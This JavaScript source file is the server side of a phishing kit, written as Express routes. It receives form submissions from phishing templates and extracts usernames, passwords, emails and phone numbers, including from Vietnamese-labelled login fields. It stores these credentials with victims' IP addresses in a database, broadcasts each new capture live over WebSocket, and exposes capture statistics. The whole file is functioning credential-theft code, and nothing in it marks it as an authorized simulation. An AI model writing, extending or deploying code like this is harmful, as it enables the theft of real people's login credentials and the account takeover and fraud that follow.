import express from 'express';
import { executeQuery } from '../../utils/database.js';

const router = express.Router();

// Capture credentials from phishing templates
router.post('/:templateId', async (req, res) => {
  try {
    const { templateId } = req.params;
    const formData = req.body;
    const ip_address = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];
    // const user_agent = req.headers['user-agent'];

    // Get template info and find associated website
    const template = await executeQuery(
      'SELECT id, name FROM templates WHERE id = ?',
      [templateId]
    );

    if (!template.success || template.data.length === 0) {
      return res.status(404).json({
        success: false,
        message: 'Template not found'
      });
    }

    // const templateData = template.data[0];

    // Find website that uses this template
    const website = await executeQuery(
      'SELECT id FROM websites WHERE phishing_template_id = ? LIMIT 1',
      [templateId]
    );

    if (!website.success || website.data.length === 0) {
      return res.status(404).json({
        success: false,
        message: 'No website found for this template'
      });
    }

    const websiteId = website.data[0].id;

    // Get template fields to know what data to expect
    // const fields = await executeQuery(
    //   'SELECT field_name, field_type FROM template_fields WHERE template_id = ?',
    //   [templateId]
    // );

    // Extract standard fields - handle various field names
    const username = formData.username || formData.user || formData.login || 
                    formData['Email or Phone'] || formData['Tên đăng nhập'] || null;
    const password = formData.password || formData.pass || formData.pwd || 
                    formData['Mật khẩu'] || formData['Password'] || null;
    const email = formData.email || formData.mail || 
                 (formData['Email or Phone'] && formData['Email or Phone'].includes('@') ? formData['Email or Phone'] : null);
    const phone = formData.phone || formData.tel || formData.mobile || 
                 (formData['Email or Phone'] && !formData['Email or Phone'].includes('@') ? formData['Email or Phone'] : null);

    // Extract additional fields based on template configuration
    const additional_fields = {};
    const standardFields = ['username', 'user', 'login', 'password', 'pass', 'pwd', 'email', 'mail', 'phone', 'tel', 'mobile'];
    
    Object.keys(formData).forEach(key => {
      if (!standardFields.includes(key.toLowerCase())) {
        additional_fields[key] = formData[key];
      }
    });

    // Insert captured data
    const result = await executeQuery(
      `INSERT INTO account_list 
       (website, user_id, username, password, ip_address, status)
       VALUES (?, ?, ?, ?, ?, ?)`,
      [
        websiteId,
        0, // Default user_id for captured data
        username || email || phone || 'unknown',
        password || 'unknown',
        ip_address,
        'success'
      ]
    );

    // Get the captured record for real-time broadcast
    const capturedRecord = await executeQuery(
      'SELECT * FROM account_list WHERE id = ?',
      [result.data.insertId]
    );

    // Broadcast to WebSocket clients (if WebSocket server is available)
    if (global.wsServer) {
      global.wsServer.broadcast(`template_${templateId}`, {
        type: 'new_capture',
        payload: capturedRecord.success ? capturedRecord.data[0] : null
      });
    }

    // Log the capture
    console.log(`📊 New credential capture for template ${templateId}:`, {
      id: result.data.insertId,
      ip: ip_address,
      fields: Object.keys(formData)
    });

    res.json({
      success: true,
      message: 'Data captured successfully',
      redirect: '/success' // You can customize this redirect
    });
  } catch (error) {
    console.error('Error capturing credentials:', error);
    console.error('Request data:', { templateId: req.params.templateId, formData: req.body });
    res.status(500).json({
      success: false,
      message: 'Failed to capture data',
      error: error.message
    });
  }
});

// Get captured data for a specific template (public endpoint for stats)
router.get('/:templateId/stats', async (req, res) => {
  try {
    const { templateId } = req.params;

    const stats = await executeQuery(
      `SELECT 
         COUNT(*) as total_captures,
         COUNT(DISTINCT ip_address) as unique_ips,
         DATE(created_at) as capture_date,
         COUNT(*) as daily_count
       FROM account_list 
       WHERE website = ?
       GROUP BY DATE(created_at)
       ORDER BY capture_date DESC
       LIMIT 30`,
      [templateId]
    );

    const totalStats = await executeQuery(
      `SELECT 
         COUNT(*) as total_captures,
         COUNT(DISTINCT ip_address) as unique_ips,
         MIN(created_at) as first_capture,
         MAX(created_at) as last_capture
       FROM account_list 
       WHERE website = ?`,
      [templateId]
    );

    res.json({
      success: true,
      data: {
        overview: totalStats.success ? totalStats.data[0] : null,
        daily_stats: stats.success ? stats.data : []
      }
    });
  } catch (error) {
    console.error('Error fetching capture stats:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch stats'
    });
  }
});

export default router;
